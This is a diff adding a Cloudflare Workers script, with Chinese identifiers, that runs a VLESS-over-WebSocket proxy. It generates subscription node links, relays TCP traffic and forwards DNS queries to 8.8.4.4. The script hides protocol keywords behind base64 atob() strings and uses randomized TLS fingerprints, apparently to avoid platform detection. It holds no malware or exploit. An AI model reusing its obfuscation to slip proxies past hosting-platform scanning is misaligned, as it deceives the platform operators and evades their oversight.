+  if (启用仓库优选 && 优选源列表.length > 0) {
+    最终链接.push(...从优选源生成链接(优选源列表, UUID, 工作器域名));
+  }
+  if (启用仓库优选 && 启用优选地址) {
+    const 新IP列表 = await 获取网络优选IP();
+    if (新IP列表.length > 0) 最终链接.push(...从新IP生成链接(新IP列表, UUID, 工作器域名));
+  }
+  if (启用原生地址 && 回退IP列表.length > 0) {
+    const 原生IP列表 = 回退IP列表.map(ip => ({ ip: ip.域名, isp: ip.域名, 端口: ip.端口 }));
+    最终链接.push(...从原生IP生成链接(原生IP列表, UUID, 工作器域名));
+  }
+  if (最终链接.length === 0) {
+    const 错误备注 = '所有节点获取失败';
+    const 错误链接 = atob('dmxlc3M=') + `://00000000-0000-0000-0000-000000000000@127.0.0.1:80?encryption=none&security=none&type=ws&host=error.com&path=%2F#${encodeURIComponent(错误备注)}`;
+    最终链接.push(错误链接);
+  }
+  const 订阅内容 = btoa(最终链接.join('\\\\n'));
+  return new Response(订阅内容, { headers: { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0' } });
+}
+function 从源生成链接(列表, UUID, 工作器域名) {
+  const HTTPS端口 = [443, 2053, 2083, 2087, 2096, 8443];
+  const 链接 = [];
+  const WS路径 = '/?ed=2048';
+  const 协议 = atob('dmxlc3M=');
+  for (const 项 of 列表) {
+    const 节点名基础 = 项.isp.replace(/\\s/g, '_');
+    const 安全IP = 项.ip.includes(':') ? '[' + 项.ip + ']' : 项.ip;
+    for (const 端口 of HTTPS端口) {
+      const WS节点名 = 节点名基础 + '-' + 端口 + '-WS-TLS';
+      const WS参数 = new URLSearchParams({ [atob('ZW5jcnlwdGlvbg==')]: atob('bm9uZQ=='), [atob('c2VjdXJpdHk=')]: atob('dGxz'), [atob('ZnA=')]: atob('cmFuZG9taXplZA=='), [atob('dHlwZQ==')]: atob('d3M='), host: 工作器域名, path: WS路径, sni: 工作器域名 });
+      链接.push(协议 + '://' + UUID + '@' + 安全IP + ':' + 端口 + '?' + WS参数.toString() + '#' + encodeURIComponent(WS节点名));
+    }
+  }
+  return 链接;
+}
+async function 获取网络优选IP() {
+  const url = 远程配置网址;
+  try {
+    const 响应 = await fetch(url);
+    if (!响应.ok) return [];
+    const 文本 = await 响应.text();
+    const 结果 = [];
+    const 行 = 文本.trim().replace(/\\r/g, '').split('\\\\n');
+    const 正则 = /^([^:]+):(\\d+)#(.*)$/;
+    for (const 单行 of 行) {
+      const 修整行 = 单行.trim();
+      if (!修整行) continue;
+      const 匹配 = 修整行.match(正则);
+      if (匹配) 结果.push({ ip: 匹配[1], 端口: parseInt(匹配[2], 10), 名称: 匹配[3].trim() || 匹配[1] });
+    }
+    return 结果;
+  } catch { return []; }
+}
+function 从新IP生成链接(列表, UUID, 工作器域名) {
+  const 链接 = [];
+  const WS路径 = '/?ed=2048';
+  const 协议 = atob('dmxlc3M=');
+  for (const 项 of 列表) {
+    const 节点名 = 项.名称;
+    const 安全IP = 项.ip.includes(':') ? '[' + 项.ip + ']' : 项.ip;
+    const 参数 = { [atob('ZW5jcnlwdGlvbg==')]: atob('bm9uZQ=='), [atob('c2VjdXJpdHk=')]: atob('dGxz'), [atob('ZnA=')]: atob('cmFuZG9taXplZA=='), [atob('dHlwZQ==')]: atob('d3M='), host: 工作器域名, path: WS路径, sni: 工作器域名 };
+    const WS参数 = new URLSearchParams(参数);
+    链接.push(协议 + '://' + UUID + '@' + 安全IP + ':' + 项.端口 + '?' + WS参数.toString() + '#' + encodeURIComponent(节点名));
+  }
+  return 链接;
+}
+function 从优选源生成链接(源列表, UUID, 工作器域名) {
+  const 链接 = [];
+  const WS路径 = '/?ed=2048';
+  const 协议 = atob('dmxlc3M=');
+  for (const 条目 of 源列表) {
+    const 部分 = 条目.split('#');
+    const 地址端口 = 部分[0].trim();
+    const 名称 = (部分[1] || '').trim() || 地址端口;
+    const 匹配 = 地址端口.match(/^(.+):(\\d+)$/);
+    if (!匹配) continue;
+    const 安全IP = 匹配[1].includes(':') ? '[' + 匹配[1] + ']' : 匹配[1];
+    const 端口 = parseInt(匹配[2], 10);
+    const 参数 = { [atob('ZW5jcnlwdGlvbg==')]: atob('bm9uZQ=='), [atob('c2VjdXJpdHk=')]: atob('dGxz'), [atob('ZnA=')]: atob('cmFuZG9taXplZA=='), [atob('dHlwZQ==')]: atob('d3M='), host: 工作器域名, path: WS路径, sni: 工作器域名 };
+    const WS参数 = new URLSearchParams(参数);
+    链接.push(协议 + '://' + UUID + '@' + 安全IP + ':' + 端口 + '?' + WS参数.toString() + '#' + encodeURIComponent(名称));
+  }
+  return 链接;
+}
+function 从原生IP生成链接(列表, UUID, 工作器域名) {
+  const 链接 = [];
+  const WS路径 = '/?ed=2048';
+  const 协议 = atob('dmxlc3M=');
+  for (const 项 of 列表) {
+    const 节点名 = 项.isp.replace(/\\s/g, '_');
+    const 安全IP = 项.ip.includes(':') ? '[' + 项.ip + ']' : 项.ip;
+    const 端口 = 项.端口 || 443;
+    const 参数 = { [atob('ZW5jcnlwdGlvbg==')]: atob('bm9uZQ=='), [atob('c2VjdXJpdHk=')]: atob('dGxz'), [atob('ZnA=')]: atob('cmFuZG9taXplZA=='), [atob('dHlwZQ==')]: atob('d3M='), host: 工作器域名, path: WS路径, sni: 工作器域名 };
+    const WS参数 = new URLSearchParams(参数);
+    链接.push(协议 + '://' + UUID + '@' + 安全IP + ':' + 端口 + '?' + WS参数.toString() + '#' + encodeURIComponent(节点名));
+  }
+  return 链接;
+}
+async function 处理WS请求(请求, 当前回退地址 = null) {
+  const WS对 = new WebSocketPair();
+  const [客户端Socket, 服务端Socket] = Object.values(WS对);
+  服务端Socket.accept();
+  let 远程连接包装 = { socket: null };
+  let 是DNS查询 = false;
+  const 早期数据 = 请求.headers.get('sec-websocket-protocol') || '';
+  const 可读流 = 创建可读流(服务端Socket, 早期数据);
+  可读流.pipeTo(new WritableStream({
+    async write(块) {
+      if (是DNS查询) return await 转发UDP(块, 服务端Socket, null);
+      if (远程连接包装.socket) {
+        const 写入器 = 远程连接包装.socket.writable.getWriter();
+        await 写入器.write(块);
+        写入器.releaseLock();
+        return;
+      }
+      const { hasError, message, addressType, port, hostname, rawIndex, version, isUDP } = 解析WS包头部(块, 认证令牌);
+      if (hasError) throw new Error(message);
+      if (isUDP) {
+        if (port === 53) 是DNS查询 = true;
+        else throw new Error(仅DNS错误);
+      }
+      const 响应头部 = new Uint8Array([version[0], 0]);
+      const 原始数据 = 块.slice(rawIndex);
+      if (是DNS查询) return 转发UDP(原始数据, 服务端Socket, 响应头部);
+      await 转发TCP(addressType, hostname, port, 原始数据, 服务端Socket, 响应头部, 远程连接包装, 当前回退地址);
+    },
+  })).catch((错误) => { console.log('WS Stream Error:', 错误); });
+  return new Response(null, { status: 101, webSocket: 客户端Socket });
+}
+async function 转发TCP(地址类型, 主机, 端口号, 原始数据, ws, 响应头部, 远程连接包装, 回退地址 = null) {
+  async function 连接并发送(地址, 端口) {
+    const 远程Socket = 连接({ hostname: 地址, port: 端口 });
+    const 写入器 = 远程Socket.writable.getWriter();
+    await 写入器.write(原始数据);
+    写入器.releaseLock();
+    return 远程Socket;
+  }
+  async function 重试连接() {
+    let 回退主机, 回退端口;
+    if (回退地址 && 回退地址.trim()) {
+      const 解析 = 解析地址和端口(回退地址);
+      回退主机 = 解析.地址;
+      回退端口 = 解析.端口 || 端口号;
+    } else {
+      const 最佳回退IP = await 获取最佳回退IP(当前工作器地区);
+      回退主机 = 最佳回退IP ? 最佳回退IP.域名 : 主机;
+      回退端口 = 最佳回退IP ? 最佳回退IP.端口 : 端口号;
+    }
+    const 新Socket = await 连接并发送(回退主机 || 主机, 回退端口);
+    远程连接包装.socket = 新Socket;
+    新Socket.closed.catch(() => {}).finally(() => 安静关闭Socket(ws));
+    连接流(新Socket, ws, 响应头部, null);
+  }
+  try {
+    const 初始Socket = await 连接并发送(主机, 端口号);
+    远程连接包装.socket = 初始Socket;
+    连接流(初始Socket, ws, 响应头部, 重试连接);
+  } catch (错误) {
+    console.log('Initial connection failed, trying fallback:', 错误);
+    重试连接();
+  }
+}
+function 解析WS包头部(块, token) {
+  if (块.byteLength < 24) return { hasError: true, message: 无效数据错误 };
+  const version = new Uint8Array(块.slice(0, 1));
+  if (格式化标识符(new Uint8Array(块.slice(1, 17))) !== token) return { hasError: true, message: 无效用户错误 };
+  const 选项长度 = new Uint8Array(块.slice(17, 18))[0];
+  const cmd = new Uint8Array(块.slice(18 + 选项长度, 19 + 选项长度))[0];
+  let 是UDP = false;
+  if (cmd === 1) {} else if (cmd === 2) { 是UDP = true; } else { return { hasError: true, message: 不支持命令错误 }; }
+  const 端口索引 = 19 + 选项长度;
+  const 端口 = new DataView(块.slice(端口索引, 端口索引 + 2)).getUint16(0);
+  let 地址索引 = 端口索引 + 2, 地址长度 = 0, 地址值索引 = 地址索引 + 1, 主机名 = '';
+  const 地址类型 = new Uint8Array(块.slice(地址索引, 地址值索引))[0];
+  switch (地址类型) {
+    case 地址类型IPv4:
+      地址长度 = 4;
+      主机名 = new Uint8Array(块.slice(地址值索引, 地址值索引 + 地址长度)).join('.');
+      break;
+    case 地址类型URL:
+      地址长度 = new Uint8Array(块.slice(地址值索引, 地址值索引 + 1))[0];
+      地址值索引 += 1;
+      主机名 = new TextDecoder().decode(块.slice(地址值索引, 地址值索引 + 地址长度));
+      break;
+    case 地址类型IPv6:
+      地址长度 = 16;
+      const IPv6部分 = [];
+      const IPv6视图 = new DataView(块.slice(地址值索引, 地址值索引 + 地址长度));
+      for (let i = 0; i < 8; i++) IPv6部分.push(IPv6视图.getUint16(i * 2).toString(16));
+      主机名 = IPv6部分.join(':');
+      break;
+    default:
+      return { hasError: true, message: 无效地址类型错误 + ': ' + 地址类型 };
+  }
+  if (!主机名) return { hasError: true, message: 空地址错误 + ': ' + 地址类型 };
+  return { hasError: false, addressType: 地址类型, port: 端口, hostname: 主机名, isUDP: 是UDP, rawIndex: 地址值索引 + 地址长度, version };
+}
+function 创建可读流(socket, 早期数据头部) {
+  let 已取消 = false;
+  return new ReadableStream({
+    start(控制器) {
+      socket.addEventListener('message', (事件) => { if (!已取消) 控制器.enqueue(事件.data); });
+      socket.addEventListener('close', () => { if (!已取消) { 安静关闭Socket(socket); 控制器.close(); } });
+      socket.addEventListener('error', (错误) => 控制器.error(错误));
+      const { earlyData, error } = base64转数组(早期数据头部);
+      if (error) 控制器.error(error);
+      else if (earlyData) 控制器.enqueue(earlyData);
+    },
+    cancel() { 已取消 = true; 安静关闭Socket(socket); }
+  });
+}
+async function 连接流(远程Socket, webSocket, 头部数据, 重试函数) {
+  let 头部 = 头部数据, 有数据 = false;
+  await 远程Socket.readable.pipeTo(new WritableStream({
+    async write(块, 控制器) {
+      有数据 = true;
+      if (webSocket.readyState !== 1) 控制器.error(连接未打开错误);
+      if (头部) {
+        webSocket.send(await new Blob([头部, 块]).arrayBuffer());
+        头部 = null;
+      } else { webSocket.send(块); }
+    },
+    abort(reason) { console.error('Readable aborted:', reason); },
+  })).catch((错误) => { console.error('Stream connection error:', 错误); 安静关闭Socket(webSocket); });
+  if (!有数据 && 重试函数) 重试函数();
+}
+async function 转发UDP(UDP块, webSocket, 响应头部) {
+  try {
+    const TCP_Socket = 连接({ hostname: '8.8.4.4', port: 53 });
+    let VLESS头部 = 响应头部;
+    const 写入器 = TCP_Socket.writable.getWriter();
+    await 写入器.write(UDP块);
+    写入器.releaseLock();
+    await TCP_Socket.readable.pipeTo(new WritableStream({
+      async write(块) {
+        if (webSocket.readyState === 1) {
+          if (VLESS头部) {
+            webSocket.send(await new Blob([VLESS头部, 块]).arrayBuffer());
+            VLESS头部 = null;
+          } else { webSocket.send(块); }
+        }
+      },
+    }));
+  } catch (错误) { console.error('DNS forward error: ' + 错误.message); }
+}
+function base64转数组(base64字符串) {
+  if (!base64字符串) return { error: null };
+  try {
+    base64字符串 = base64字符串.replace(/-/g, '+').replace(/_/g, '/');
+    return { earlyData: Uint8Array.from(atob(base64字符串), (c) => c.charCodeAt(0)).buffer, error: null };
+  } catch (错误) { return { error }; }
+}
+function 是合法UUID(uuid) {
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(uuid);
+}
+function 安静关闭Socket(socket) {
+  try { if (socket.readyState === 1 || socket.readyState === 2) socket.close(); } catch (错误) {}
+}
+const 十六进制表 = Array.from({ length: 256 }, (v, i) => (i + 256).toString(16).slice(1));
+function 格式化标识符(数组, 偏移 = 0) {
+  const id = (十六进制表[数组[偏移]] + 十六进制表[数组[偏移 + 1]] + 十六进制表[数组[偏移 + 2]] + 十六进制表[数组[偏移 + 3]] + '-' + 十六进制表[数组[偏移 + 4]] + 十六进制表[数组[偏移 + 5]] + '-' + 十六进制表[数组[偏移 + 6]] + 十六进制表[数组[偏移 + 7]] + '-' + 十六进制表[数组[偏移 + 8]] + 十六进制表[数组[偏移 + 9]] + '-' + 十六进制表[数组[偏移 + 10]] + 十六进制表[数组[偏移 + 11]] + 十六进制表[数组[偏移 + 12]] + 十六进制表[数组[偏移 + 13]] + 十六进制表[数组[偏移 + 14]] + 十六进制表[数组[偏移 + 15]]).toLowerCase();
+  if (!是合法UUID(id)) throw new TypeError(无效ID错误);
+  return id;
+}
+// see: developers.cloudflare.com/workers
+// eslint-disable-next-line
